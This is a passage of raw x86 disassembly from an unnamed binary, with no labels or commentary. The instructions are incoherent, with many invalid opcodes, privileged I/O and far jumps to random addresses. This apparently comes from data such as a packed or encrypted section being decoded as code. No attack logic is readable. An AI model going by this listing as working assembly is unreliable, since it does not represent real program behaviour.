  409882:	adc    edi,DWORD PTR [ebx+esi*4+0x2f]
  409886:	xor    DWORD PTR [edx+0x3c3b5f4f],edi
  40988c:	pop    ds
  40988d:	cmc    
  40988e:	sbb    ebx,DWORD PTR [esi+0x71]
  409891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409892:	or     DWORD PTR [ebp+0x71326b52],ebx
  409898:	aaa    
  409899:	mov    dh,0x5e
  40989b:	clc    
  40989c:	dec    ecx
  40989d:	adc    eax,0x9777eea4
  4098a2:	iret   
  4098a3:	add    ebp,DWORD PTR ds:0x9aec915
  4098a9:	push   ds
  4098aa:	sub    BYTE PTR [eax-0x6d],al
  4098ad:	in     al,0x3b
  4098af:	mov    ebx,DWORD PTR [ecx]
  4098b1:	xor    DWORD PTR [edx+eiz*2+0x3e],esp
  4098b5:	push   ecx
  4098b6:	adc    eax,esi
  4098b8:	pop    ecx
  4098b9:	adc    BYTE PTR [ecx],dl
  4098bb:	cmc    
  4098bc:	sti    
  4098bd:	outs   dx,DWORD PTR ds:[esi]
  4098be:	outs   dx,BYTE PTR ds:[esi]
  4098bf:	sbb    BYTE PTR [edi+edx*8],0x23
  4098c3:	and    al,0x6a
  4098c5:	mov    ecx,0xd65afaaf
  4098ca:	js     0x409906
  4098cc:	iret   
  4098cd:	sub    eax,0xc7e693f9
  4098d2:	popf   
  4098d3:	dec    eax
  4098d4:	and    BYTE PTR [eax+eiz*8-0x44],dh
  4098d8:	adc    BYTE PTR [esi-0x7d],0x98
  4098dc:	call   0xde25:0x6f9773d
  4098e3:	add    BYTE PTR ds:0xbbf3dfd0,0xf1
  4098ea:	and    DWORD PTR [ebx+0x2cebfdb4],ecx
  4098f0:	fdivr  DWORD PTR [ebx]
  4098f2:	test   al,0xfd
  4098f4:	mov    ebx,0x219053c6
  4098f9:	fcom   DWORD PTR [ebp-0x14702d3f]
  4098ff:	sbb    ch,BYTE PTR [eax+ebx*8-0x6f]
  409903:	mov    edi,0x8c5a1a16
  409908:	inc    eax
  409909:	jno    0x409906
  40990b:	sbb    al,0x8c
  40990d:	mov    edi,0xe2766c63
  409912:	test   DWORD PTR [edi+0x16685a6f],esp
  409918:	jae    0x4098ca
  40991a:	(bad)  
  40991d:	ret    
  40991e:	lods   eax,DWORD PTR ds:[esi]
  40991f:	mov    esp,fs
  409921:	and    al,0xfb
  409923:	add    al,0x9b
  409925:	fmul   DWORD PTR [eax+0x4b]
  409928:	sub    al,0x9f
  40992a:	fiadd  WORD PTR [edi]
  40992c:	mov    cl,0x24
  40992e:	push   es
  40992f:	hlt    
  409930:	dec    ebp
  409931:	sub    al,0x28
  409933:	fstp   QWORD PTR [edi]
  409935:	bound  ebp,QWORD PTR [esi]
  409937:	fcomp  DWORD PTR [eax-0xbb08e77]
  40993d:	lds    esi,FWORD PTR [edi+0x33]
  409940:	and    cl,BYTE PTR [edi-0x23fd3333]
  409946:	mov    ebp,0x2efe2843
  40994b:	push   0x271c0504
  409950:	xor    al,0xee
  409952:	jmp    0x4098ed
  409954:	(bad)  
  409955:	imul   ebp,DWORD PTR [eax+eax*8],0xbd22d2ca
  40995c:	dec    ebp
  40995d:	cs mov ah,0x70
  409960:	inc    esp
  409961:	loopne 0x40990b
  409963:	sub    bh,al
  409965:	aaa    
  409966:	xchg   ebx,eax
  409967:	es mov edx,0x4cdbd26a
  40996d:	dec    edx
  40996e:	cwde   
  40996f:	data16 aad 0xe0
  409972:	adc    ah,al
  409974:	(bad)  
  409975:	mov    edi,0xa84b3a30
  40997a:	out    dx,al
  40997b:	or     ebp,DWORD PTR [edx]
  40997d:	jge    0x4099c7
  40997f:	call   0x2704:0xa1599f20
  409986:	ds icebp 
  409988:	xor    ch,BYTE PTR [eax]
  40998a:	mov    DWORD PTR [esi+0x33be656d],0x2aaeb0b0
  409994:	iret   
  409995:	imul   ebp,edi,0x15
  409998:	inc    esi
  409999:	push   esp
  40999a:	int    0x64
  40999c:	leave  
  40999d:	xchg   edi,eax
  40999e:	dec    ebx
  40999f:	jbe    0x409996
  4099a1:	scas   al,BYTE PTR es:[edi]
  4099a2:	xchg   esi,eax
  4099a3:	pop    ebp
  4099a4:	add    DWORD PTR [esi+ebx*4-0x312fe901],ecx
  4099ab:	stos   BYTE PTR es:[edi],al
  4099ac:	push   esi
  4099ad:	das    
  4099ae:	ret    0xf7b8
  4099b1:	call   0x3712:0x5d6f784c
  4099b8:	loop   0x4099e1
  4099ba:	push   esp
  4099bb:	jne    0x40996b
  4099bd:	clc    
  4099be:	leave  
  4099bf:	imul   edx,DWORD PTR [edx-0x24],0x40
  4099c3:	cmp    DWORD PTR [esp+eax*8],0x5fca6093
  4099ca:	pushf  
  4099cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099cc:	mov    edi,0xbd31f807
  4099d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099d2:	icebp  
  4099d3:	in     eax,0x7d
  4099d5:	pushf  
  4099d6:	xchg   edx,eax
  4099d7:	mov    cl,0x4
  4099d9:	es cmp eax,0xf645c6bd
  4099df:	mov    ebp,0x327692ea
  4099e4:	in     eax,0xb4
  4099e6:	jne    0x409a03
  4099e8:	sbb    DWORD PTR [esp+ebx*8-0x32958cb9],0x5b5972d4
  4099f3:	dec    edi
  4099f4:	inc    esi
  4099f5:	pop    ecx
  4099f6:	popa   
  4099f7:	xchg   ebx,eax
  4099f8:	cwde   
  4099f9:	scas   al,BYTE PTR es:[edi]
  4099fa:	in     al,dx
  4099fb:	out    dx,eax
  4099fc:	cmp    ah,cl
  4099fe:	mov    al,BYTE PTR [ebp+0x66a3cc5b]
  409a04:	(bad)  
  409a05:	(bad)  
  409a07:	xchg   esi,eax
  409a08:	ja     0x4099dd
  409a0a:	lahf   
  409a0b:	div    dl
  409a0d:	in     eax,0x96
  409a0f:	xlat   BYTE PTR ds:[ebx]
  409a10:	xchg   edx,eax
  409a11:	mov    ecx,0xe9e839d7
  409a16:	jl     0x409a1c
  409a18:	mov    ch,0x57
  409a1a:	fisttp DWORD PTR [edx+0x7c]
  409a1d:	popf   
  409a1e:	cmp    DWORD PTR [edi],esi
  409a20:	add    eax,ebx
  409a22:	sbb    dh,BYTE PTR [ebp+0x2ceadb11]
  409a28:	lods   al,BYTE PTR ds:[esi]
  409a29:	push   ebp
  409a2a:	jmp    0x87ad:0x82e33504
  409a31:	inc    ebx
  409a32:	scas   eax,DWORD PTR es:[edi]
  409a33:	or     esp,DWORD PTR [esi]
  409a35:	xlat   BYTE PTR ds:[ebx]
  409a36:	shl    DWORD PTR [edi+0x4d],0x75
  409a3a:	adc    bl,cl
  409a3c:	out    dx,eax
  409a3d:	mov    esi,0x1543cf9d
  409a42:	mov    ebp,0x14971342
  409a47:	inc    edx
  409a48:	popf   
  409a49:	sbb    BYTE PTR [ecx],dh
  409a4b:	mov    edi,edx
  409a4d:	inc    ebx
  409a4e:	adc    al,0xea
  409a50:	cmp    dh,BYTE PTR [ecx+0x289c0d6a]
  409a56:	dec    eax
  409a57:	inc    edx
  409a58:	cs or  ebx,eax
  409a5b:	adc    eax,0x2225181f
  409a60:	test   al,0xb3
  409a62:	in     al,dx
  409a63:	cmp    ch,BYTE PTR [ecx-0x4ebdff2b]
  409a69:	cwde   
  409a6a:	loope  0x409a2b
  409a6c:	dec    eax
  409a6d:	mov    BYTE PTR [ebx+ebx*4+0x5d],dh
  409a71:	fmul   DWORD PTR [edi]
  409a73:	cmp    dh,BYTE PTR [edi+0x76]
  409a76:	jge    0x409a33
  409a78:	shl    DWORD PTR [edx],cl
  409a7a:	(bad)  
  409a7b:	and    ecx,DWORD PTR [edi]
  409a7d:	or     edx,DWORD PTR [eax]
  409a7f:	sti    
  409a80:	sub    BYTE PTR [edx+0x5],dh
  409a83:	fmul   st(6),st
  409a85:	test   DWORD PTR [edi+edi*2-0x35cbc06b],esi
  409a8c:	mov    BYTE PTR [esp+eax*2-0x6],cl
  409a90:	add    eax,0x1a57b0be
  409a95:	push   0x5752cf2c
  409a9a:	call   0x6cb8e2ca
  409a9f:	jnp    0x409adf
  409aa1:	ror    cl,1
  409aa3:	mov    al,0xd
  409aa5:	mov    ecx,0x1f40fbc5
  409aaa:	sbb    ebp,DWORD PTR [ebp-0x6ce9dc03]
  409ab0:	jp     0x409ae9
  409ab2:	adc    edi,eax
  409ab4:	pop    ss
  409ab5:	pop    edi
  409ab6:	ja     0x409aa6
  409ab8:	push   0xf
  409aba:	mov    dl,0x35
  409abc:	cmp    DWORD PTR [edx-0x3e],ebp
  409abf:	jo     0x409ab1
  409ac1:	repz jae 0x409b08
  409ac4:	test   eax,0xf4012683
  409ac9:	lods   al,BYTE PTR ds:[esi]
  409aca:	dec    edi
  409acb:	out    dx,eax
  409acc:	(bad)  [edx]
  409ace:	sahf   
  409acf:	xchg   edi,eax
  409ad0:	sub    edx,DWORD PTR [esi-0x2d]
  409ad3:	or     DWORD PTR [edx-0x67],ecx
  409ad6:	jle    0x409b48
  409ad8:	dec    edx
  409ad9:	xchg   esp,eax
  409ada:	popa   
  409adb:	mov    ds:0xd389fb9c,eax
  409ae0:	rcl    esi,1
  409ae2:	xchg   BYTE PTR [edx],al
  409ae4:	outs   dx,BYTE PTR ds:[esi]
  409ae5:	pop    ecx
  409ae6:	inc    esi
  409ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ae8:	cmc    
  409ae9:	into   
  409aea:	stc    
  409aeb:	and    esi,DWORD PTR [esi]
  409aed:	ror    BYTE PTR [ecx-0x2ce3f044],1
  409af3:	add    DWORD PTR gs:[ecx+0x75d3b51b],ebp
  409afa:	out    0x83,eax
  409afc:	int3   
  409afd:	pop    es
  409afe:	mov    edi,0x8500574a
  409b03:	pop    ecx
  409b04:	js     0x409aad
  409b06:	iret   
  409b07:	out    0x3c,eax
  409b09:	(bad)  
  409b0a:	lods   al,BYTE PTR ds:[esi]
  409b0b:	inc    ebp
  409b0c:	adc    edx,DWORD PTR [esi]
  409b0e:	fcmovne st,st(0)
  409b10:	imul   ebp,DWORD PTR [ebx+0x3b],0xb8f5af01
  409b17:	mov    cl,0xe
  409b19:	or     al,0x4b
  409b1b:	cmp    DWORD PTR [ecx],edx
  409b1d:	or     eax,0x115cda8c
  409b22:	mov    dh,0x80
  409b24:	xchg   esp,eax
  409b25:	repnz idiv BYTE PTR [edi+0x39]
  409b29:	mov    ds:0x5699c325,eax
  409b2e:	sbb    al,0xb3
  409b30:	out    0x53,al
  409b32:	xlat   BYTE PTR ds:[ebx]
  409b33:	cmp    ch,0x97
  409b36:	in     eax,dx
  409b37:	pop    edi
  409b38:	retf   0x8534
  409b3b:	hlt    
  409b3c:	je     0x409b47
  409b3e:	rcl    BYTE PTR [esi+0x7b],1
  409b41:	or     bl,al
  409b43:	mov    ah,0x85
  409b45:	int3   
  409b46:	push   cs
  409b47:	lods   al,BYTE PTR ds:[esi]
  409b48:	mov    ds:0x8ef82f75,eax
  409b4d:	lea    eax,[ebx]
  409b4f:	cmc    
  409b50:	dec    ecx
  409b51:	enter  0x2bfe,0x28
  409b55:	push   ebx
  409b56:	clc    
  409b57:	call   0x5aba0a0
  409b5c:	stc    
  409b5d:	mov    al,ds:0xd8dd09f8
  409b62:	mov    ds:0xc2c92ec4,al
  409b67:	test   DWORD PTR [edx],edx
  409b69:	jns    0x409b5a
  409b6b:	mov    ds:0x7eb3ccc3,eax
  409b70:	push   es
  409b71:	fsub   st,st(0)
  409b73:	leave  
  409b74:	mov    al,0xf
  409b76:	mov    WORD PTR [ecx+0xf],gs
  409b79:	clc    
  409b7a:	pusha  
  409b7b:	push   eax
  409b7c:	dec    ecx
  409b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b7e:	in     al,0xac
  409b80:	xor    eax,0x1658ab95
  409b85:	dec    eax
  409b86:	popf   
  409b87:	dec    ebp
  409b88:	jmp    0x9d65:0x8f1c15bb
  409b8f:	xchg   esi,eax
  409b90:	mov    ch,0x9a
  409b92:	jo     0x409bc3
  409b94:	push   es
  409b95:	jnp    0x409c0d
  409b97:	shl    DWORD PTR [ebp-0x16],1
  409b9a:	sbb    ebp,DWORD PTR [ebx-0x61e8c434]
  409ba0:	das    
  409ba1:	call   0xff14e488
  409ba6:	not    DWORD PTR [ebx-0x5f]
  409ba9:	(bad)  [ebx]
  409bab:	adc    ah,BYTE PTR ds:0x1a7fe04b
  409bb1:	and    DWORD PTR [ebx+0xe14cf5f],edx
  409bb7:	xor    eax,0x21189954
  409bbc:	pushf  
  409bbd:	cs adc eax,0xb9182919
  409bc3:	jl     0x409c2e
  409bc5:	fisttp QWORD PTR [edx+0x64]
  409bc8:	pop    ecx
  409bc9:	mov    ch,0x3a
  409bcb:	adc    BYTE PTR [ebx],al
  409bcd:	xor    ebx,DWORD PTR [edx+eiz*2-0x2906f744]
  409bd4:	xchg   ecx,eax
  409bd5:	jns    0x409c33
  409bd7:	fcom   st(6)
  409bd9:	xchg   ecx,eax
  409bda:	icebp  
  409bdb:	jle    0x409b9f
  409bdd:	xor    eax,0xbf94bd8f
  409be2:	rcr    DWORD PTR [ebx],0xde
  409be5:	imul   DWORD PTR [edi]
  409be7:	test   eax,0xc4bfcdb2
  409bec:	mov    esp,0xfe3221d6
  409bf1:	fld    TBYTE PTR [ebx-0x1d0f54bb]
  409bf7:	inc    eax
  409bf8:	push   esp
  409bf9:	popf   
  409bfa:	in     eax,dx
  409bfb:	add    al,0xc9
  409bfd:	sub    ebx,DWORD PTR [edx+0x7c2f3081]
  409c03:	inc    eax
  409c04:	dec    ecx
  409c05:	loopne 0x409bfb
  409c07:	xor    eax,0x8f09258d
  409c0c:	jb     0x409c8d
  409c0e:	ja     0x409bd4
  409c10:	mov    WORD PTR [eax],cs
  409c12:	add    al,0xc6
  409c14:	jae    0x409c06
  409c16:	sub    DWORD PTR [edi+0x5c],edx
  409c19:	jns    0x409b9e
  409c1b:	ins    BYTE PTR es:[edi],dx
  409c1c:	ins    BYTE PTR es:[edi],dx
  409c1d:	adc    al,0x4f
  409c1f:	jo     0x409c79
  409c21:	sub    ah,BYTE PTR [esi]
  409c23:	retf   0xdf82
  409c26:	idiv   BYTE PTR [esi]
  409c28:	and    bh,BYTE PTR [ecx-0x2d2d72c2]
  409c2e:	lock call 0x74f4:0xceb6bab9
  409c36:	adc    ebp,DWORD PTR [edx]
  409c38:	pop    es
  409c39:	adc    dl,BYTE PTR [esp+esi*4]
  409c3c:	pushf  
  409c3d:	cld    
  409c3e:	icebp  
  409c3f:	mov    BYTE PTR [eax+edi*2+0x7e253149],bh
  409c46:	add    BYTE PTR [edi-0xc],ah
  409c49:	and    bh,dh
  409c4b:	pushf  
  409c4c:	jecxz  0x409c3f
  409c4e:	out    0x52,eax
  409c50:	xlat   BYTE PTR ds:[ebx]
  409c51:	adc    eax,0x5722cd85
  409c56:	ror    DWORD PTR ds:0xa79769be,0x40
  409c5d:	call   0xdd8e:0xf0af9c29
  409c64:	mov    cl,0xbd
  409c66:	(bad)  
  409c67:	xor    BYTE PTR [eax-0x34bea64],cl
  409c6d:	ffree  st(5)
  409c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c70:	out    0xbe,al
  409c72:	in     eax,0xa
  409c74:	and    al,0xa3
  409c76:	je     0x409c5f
  409c78:	inc    esp
  409c79:	in     al,dx
  409c7a:	jne    0x409cc0
  409c7c:	loope  0x409c42
  409c7e:	inc    eax
  409c7f:	ja     0x409cad
  409c81:	mov    edx,0x5cc2894f
  409c86:	push   ds
  409c87:	test   bl,0xbf
  409c8a:	sbb    ebp,DWORD PTR [esi-0x1b96a342]
  409c90:	pop    ebx
  409c91:	sub    ebp,DWORD PTR [ecx+0x2e0d68df]
  409c97:	xor    ebp,0x25
  409c9a:	dec    esp
  409c9b:	clc    
  409c9c:	jbe    0x409c2b
  409c9e:	in     eax,dx
  409c9f:	mov    ebp,0xa1bb9d
  409ca4:	cmp    DWORD PTR [ebp-0x4188f471],ebx
  409caa:	mov    WORD PTR [eax-0xa37c0ff],?
  409cb0:	cmp    esi,esi
  409cb2:	jmp    0xa684:0xaf597fdb
  409cb9:	sbb    BYTE PTR [edi],dh
  409cbb:	inc    eax
  409cbc:	add    esp,ecx
  409cbe:	int    0x58
  409cc0:	iret   
  409cc1:	pop    esi
  409cc2:	iret   
  409cc3:	hlt    
  409cc4:	loopne 0x409cc9
  409cc6:	add    bh,BYTE PTR [eax-0x3d2b162d]
  409ccc:	sbb    bh,BYTE PTR [ebx+0x232e964a]
  409cd2:	je     0x409d0d
  409cd4:	jge    0x409c84
  409cd6:	xor    BYTE PTR [edx+0x9b7674e],dl
  409cdc:	xchg   esi,eax
  409cdd:	push   ebx
  409cde:	(bad)  
  409cdf:	(bad)  
  409ce0:	mov    bl,0x8a
  409ce2:	popf   
  409ce3:	push   esp
  409ce4:	xchg   ebp,eax
  409ce5:	xchg   ebx,eax
  409ce6:	pop    esp
  409ce7:	adc    BYTE PTR ds:0xeb44c7e5,bh
  409ced:	jae    0x409cd0
  409cef:	int3   
  409cf0:	xchg   esi,eax
  409cf1:	xlat   BYTE PTR ss:[ebx]
  409cf3:	push   ebx
  409cf4:	(bad)  
  409cf5:	icebp  
  409cf6:	jns    0x409cba
  409cf8:	inc    edx
  409cf9:	shufps xmm3,xmm3,0x4a
  409cfd:	data16 xor dl,bh
  409d00:	or     DWORD PTR [ebx+eax*8-0x71b681a3],0xa2f9a6f
  409d0b:	dec    esi
  409d0c:	or     BYTE PTR [esp+edx*2-0x72],0x15
  409d11:	sub    ch,BYTE PTR [eax+0x1a]
  409d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d15:	jnp    0x409ce4
  409d17:	or     ecx,DWORD PTR [edx]
  409d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d1a:	jo     0x409d6b
  409d1c:	aas    
  409d1d:	jno    0x409d81
  409d1f:	retf   0x9ec0
  409d22:	cmp    dl,BYTE PTR [edx+ebx*2]
  409d25:	fcmovb st,st(7)
  409d27:	mov    al,ds:0x82ffe031
  409d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d2d:	enter  0x821f,0x33
  409d31:	cld    
  409d32:	and    eax,0x423d5c59
  409d37:	sbb    esi,ebx
  409d39:	outs   dx,BYTE PTR ds:[esi]
  409d3a:	(bad)  ds:0x404ea2ee
  409d40:	jnp    0x409da3
  409d42:	pushf  
  409d43:	arpl   bx,di
  409d45:	cmp    esp,DWORD PTR [edx]
  409d47:	mov    esp,0xa5ccc561
  409d4c:	in     eax,0x0
  409d4e:	in     al,0x67
  409d50:	aad    0xc6
  409d52:	jb     0x409da8
  409d54:	pop    edx
  409d55:	push   cs
  409d56:	jmp    0x4f1b82b3
  409d5b:	call   0x3748af7f
  409d60:	push   ecx
  409d61:	adc    BYTE PTR [edi+ebx*2],bh
  409d64:	mov    bp,0xd553
  409d68:	(bad)
  409d6b:	inc    edx
  409d6c:	ins    DWORD PTR es:[edi],dx
  409d6d:	xor    eax,0x196d62f2
  409d72:	mov    esp,0x81835224
  409d77:	cwde   
  409d78:	data16 fdivr st,st(2)
  409d7b:	cmp    BYTE PTR [ebx+0x49],ch
  409d7e:	mov    ebp,0xf098c277
  409d83:	in     eax,0x67
  409d85:	cld    
  409d86:	dec    ebx
  409d87:	push   esp
  409d88:	jb     0x409d20
  409d8a:	xchg   BYTE PTR [ecx],al
  409d8c:	std    
  409d8d:	mov    ds:0xecf689e,eax
  409d92:	mov    ds:0xd026e911,eax
  409d97:	and    ebx,DWORD PTR [edx+ecx*4+0x79]
  409d9b:	ret    
  409d9c:	cmp    eax,0xaa7843bf
  409da1:	sub    al,0x10
  409da3:	int    0x85
  409da5:	ret    0x6a3e
  409da8:	mov    ah,BYTE PTR [edi]
  409daa:	sub    ebx,esp
  409dac:	and    ebx,DWORD PTR [esp+esi*4+0x7a]
  409db0:	jp     0x409e18
  409db2:	sub    DWORD PTR [eax+ebx*8],ecx
  409db5:	adc    ebp,DWORD PTR [ecx+0x2d432134]
  409dbb:	mov    ebp,0xbebd82a3
  409dc0:	ds push 0x6e09dec9
  409dc6:	imul   ebp,DWORD PTR [ebx+eax*2],0x19
  409dca:	mov    bl,0x3
  409dcc:	push   ecx
  409dcd:	xor    BYTE PTR ds:0x78aba97,0x69
  409dd4:	cs out 0x5a,eax
  409dd7:	out    0x38,al
  409dd9:	mov    eax,ds:0x46f7274e
  409dde:	sahf   
  409ddf:	adc    eax,0x47293751
  409de4:	outs   dx,DWORD PTR ds:[esi]
  409de5:	push   ebx
  409de6:	rcr    BYTE PTR [edi],cl
  409de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409de9:	in     al,0x88
  409deb:	inc    edx
  409dec:	dec    esp
  409ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dee:	cmp    BYTE PTR [ebx-0x46],bh
  409df1:	cs mov al,0x5d
  409df4:	fsubr  st,st(3)
  409df6:	call   0xb173437e
  409dfb:	ficomp WORD PTR [edx+0x5d]
  409dfe:	dec    edx
  409dff:	jecxz  0x409e5d
  409e01:	inc    eax
  409e02:	int    0xf1
  409e04:	pop    esp
  409e05:	or     eax,0xcf612dae
  409e0a:	fdiv   st(6),st
  409e0c:	adc    BYTE PTR [ecx+0x2cbf05b8],ch
  409e12:	mov    DWORD PTR [ebx],ecx
  409e14:	in     al,0xf6
  409e16:	leave  
  409e17:	xor    eax,0x476a8b69
  409e1c:	bound  eax,QWORD PTR [ebx+edx*1+0x2a11d594]
  409e23:	cld    
  409e24:	test   BYTE PTR [esi+0x757647a3],cl
  409e2a:	push   es
  409e2b:	pop    ss
  409e2c:	int3   
  409e2d:	loop   0x409dbf
  409e2f:	scas   al,BYTE PTR es:[edi]
  409e30:	xor    DWORD PTR [edi+0x65fdfb60],ebx
  409e36:	jg     0x409dc7
  409e38:	repz sbb DWORD PTR [eax],ebx
  409e3b:	or     edi,ecx
  409e3d:	and    BYTE PTR [esi],dh
  409e3f:	mov    DWORD PTR [eiz*8-0xf3538ce],esi
  409e46:	mov    ds:0x6d2f36ec,eax
  409e4b:	mov    ebx,0xe526aaee
  409e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e51:	xchg   edi,eax
  409e52:	and    eax,0xd2332874
  409e57:	mov    bl,bl
  409e59:	mov    bh,0xa9
  409e5b:	ja     0x409e47
  409e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e5e:	adc    edi,ecx
  409e60:	or     eax,0x5bc86e3c
  409e65:	jbe    0x409ee5
  409e67:	mov    esi,0xc8ebfe26
  409e6c:	pop    ebp
  409e6d:	cmp    al,0x4f
  409e6f:	hlt    
  409e70:	add    DWORD PTR [ebx+0x2b],esp
  409e73:	dec    eax
  409e74:	imul   edi,DWORD PTR [ecx],0xffffffb6
  409e77:	xor    DWORD PTR [eax-0x45],esi
  409e7a:	jmp    0x4c1e:0x8e17fb79
  409e81:	out    0xed,eax
  409e83:	push   esp
  409e84:	dec    sp
  409e86:	xchg   edi,eax
  409e87:	mov    ecx,0xd08cf6e4
  409e8c:	pop    ds
  409e8d:	mov    dh,BYTE PTR [ecx]
  409e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e90:	jo     0x409ed8
  409e92:	sbb    BYTE PTR [ecx],ch
  409e94:	jae    0x409e8b
  409e96:	cwde   
  409e97:	mov    dl,dl
  409e99:	std    
  409e9a:	sbb    ch,cl
  409e9c:	rcl    BYTE PTR [edx+edi*1-0x48a33d18],1
  409ea3:	fmul   DWORD PTR [esi]
  409ea5:	mov    cs,WORD PTR [ebp-0x2f87f4d8]
  409eab:	and    eax,0x41572b96
  409eb0:	mov    cl,0x2
  409eb2:	bound  ebp,QWORD PTR [edx]
  409eb4:	hlt    
  409eb5:	cmp    edx,DWORD PTR [edx+0x5a]
  409eb8:	loope  0x409e56
  409eba:	jmp    0xff128e83
  409ebf:	push   eax
  409ec0:	sti    
  409ec1:	push   0x86885369
  409ec6:	popa   
  409ec7:	fst    st(2)
  409ec9:	jmp    0x409ea4
  409ecb:	sbb    al,0xbc
  409ecd:	adc    eax,0x7a8bbc56
  409ed2:	or     BYTE PTR [edx-0x1c],ah
  409ed5:	mov    ah,0x7b
  409ed7:	inc    eax
  409ed8:	xlat   BYTE PTR ds:[ebx]
  409ed9:	or     DWORD PTR [edi-0x1f54ab18],0x13fb693
  409ee3:	lea    edi,[eax]
  409ee5:	dec    edi
  409ee6:	rcl    DWORD PTR [ecx+0x65c055f1],1
  409eec:	lods   al,BYTE PTR ds:[esi]
  409eed:	xchg   bl,bh
  409eef:	mov    cl,0x24
  409ef1:	into   
  409ef2:	mov    edi,ebp
  409ef4:	jmp    0x409ecd
  409ef6:	add    bl,dl
  409ef8:	mov    WORD PTR [ebp-0x250f6cd3],es
  409efe:	push   eax
  409eff:	or     eax,DWORD PTR [esi]
  409f01:	in     eax,0x6b
  409f03:	imul   esi,DWORD PTR [ecx+esi*4+0x4feeaae4],0x92379cfd
  409f0e:	and    BYTE PTR [edx+0x1d],dl
  409f11:	imul   edi,DWORD PTR ds:0x10a52553,0x43
  409f18:	out    0x1d,eax
  409f1a:	lds    edx,FWORD PTR [edi+0x2b]
  409f1d:	ins    BYTE PTR es:[edi],dx
  409f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f1f:	mov    bh,BYTE PTR [eax+0xd6baf04]
  409f25:	xor    dl,BYTE PTR [ebx]
  409f27:	pop    esi
  409f28:	out    0x56,al
  409f2a:	aas    
  409f2b:	jmp    0x409f5c
  409f2d:	xchg   DWORD PTR [esi+0x234150cb],ebx
  409f33:	xor    DWORD PTR [esi+esi*8+0x6c5074ca],edx
  409f3a:	es xchg esp,eax
  409f3c:	(bad)  
  409f3d:	cmp    ecx,DWORD PTR ds:0xb24529ad
  409f43:	dec    edi
  409f44:	push   esp
  409f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f46:	cmp    BYTE PTR [eax],al
  409f48:	pop    esi
  409f49:	icebp  
  409f4a:	fidiv  DWORD PTR [edi-0x3d]
  409f4d:	pusha  
  409f4e:	(bad)  
  409f4f:	cmp    eax,0xba0bef99
  409f54:	repnz mov al,ds:0xe22a17ad
  409f5a:	and    al,0x4a
  409f5c:	(bad)  
  409f5d:	push   edi
  409f5e:	add    DWORD PTR [ebp-0x2dec6eca],edi
  409f64:	aam    0x73
  409f66:	dec    esp
  409f67:	adc    ebp,DWORD PTR [ecx+0x60f29185]
  409f6d:	mov    esp,0xb451f956
  409f72:	mov    edi,0x22ab7a01
  409f77:	(bad)  
  409f79:	test   al,0x7e
  409f7b:	jg     0x409f37
  409f7d:	dec    eax
  409f7e:	adc    al,0x17
  409f80:	retf   
  409f81:	sub    dl,BYTE PTR [edi+0x7e39cb1a]
  409f87:	and    dh,bh
  409f89:	cdq    
  409f8a:	push   eax
  409f8b:	pop    ebx
  409f8c:	sar    al,1
  409f8e:	popf   
  409f8f:	add    eax,0xcd223fe5
  409f94:	xchg   BYTE PTR [edi-0x3e],ch
  409f97:	in     al,dx
  409f98:	dec    BYTE PTR [esi]
  409f9a:	loopne 0x409fa9
  409f9c:	push   eax
  409f9d:	fcom   st(4)
  409f9f:	scas   al,BYTE PTR es:[edi]
  409fa0:	xchg   BYTE PTR [ecx-0x3c],dl
  409fa3:	stc    
  409fa4:	cs nop
  409fa6:	or     al,0x4e
  409fa8:	fistp  QWORD PTR [edx+0x2]
  409fab:	sub    DWORD PTR [eax+0x47],0x23
  409faf:	jg     0x409f8c
  409fb1:	pop    es
  409fb2:	out    dx,eax
  409fb3:	pop    esi
  409fb4:	and    ecx,DWORD PTR [ebp+0x3b]
  409fb7:	rcl    BYTE PTR [eax],1
  409fb9:	imul   ah
  409fbb:	in     eax,dx
  409fbc:	xchg   edx,eax
  409fbd:	or     al,BYTE PTR [ecx+0x76]
  409fc0:	scas   eax,DWORD PTR es:[edi]
  409fc1:	lods   al,BYTE PTR ds:[esi]
  409fc2:	adc    al,0x2b
  409fc4:	add    bl,bl
  409fc6:	dec    ebp
  409fc7:	mov    esp,0xae6dc6b6
  409fcc:	stos   BYTE PTR es:[edi],al
  409fcd:	ds and bl,dl
  409fd0:	jecxz  0x40a039
  409fd2:	(bad)  
  409fd3:	or     ebx,DWORD PTR [ebp+eax*4-0xd]
  409fd7:	jecxz  0x40a039
  409fd9:	ja     0x40a04a
  409fdb:	push   cs
  409fdc:	repnz push 0xfffffff9
  409fdf:	gs push 0x7a
  409fe2:	(bad)  
  409fe3:	leave  
  409fe4:	ds in  eax,0x9b
  409fe7:	retf   
  409fe8:	addr16 sar bl,cl
  409feb:	push   edi
  409fec:	jnp    0x40a002
  409fee:	or     al,0xcf
  409ff0:	add    bl,BYTE PTR [eax+0x2f8cca20]
  409ff6:	push   es
  409ff7:	cmp    dl,dh
  409ff9:	pop    esi
  409ffa:	pop    ebp
  409ffb:	in     eax,dx
  409ffc:	mov    edi,0x4cb1cf25
  40a001:	jg     0x409ffb
  40a003:	jmp    0x2bcb0f0d
  40a008:	inc    ecx
  40a009:	mov    eax,0xf556c332
  40a00e:	xchg   edi,eax
  40a00f:	sbb    BYTE PTR [eax+edx*4],0x0
  40a013:	repz pusha 
  40a015:	test   al,0x7a
  40a017:	or     edi,eax
  40a019:	aas    
  40a01a:	out    dx,al
  40a01b:	stos   BYTE PTR es:[edi],al
  40a01c:	mov    dl,0x66
  40a01e:	jo     0x409fc7
  40a020:	or     DWORD PTR [ecx-0x34],esp
  40a023:	call   DWORD PTR [ecx-0x23]
  40a026:	jnp    0x409fe1
  40a028:	jns    0x40a08d
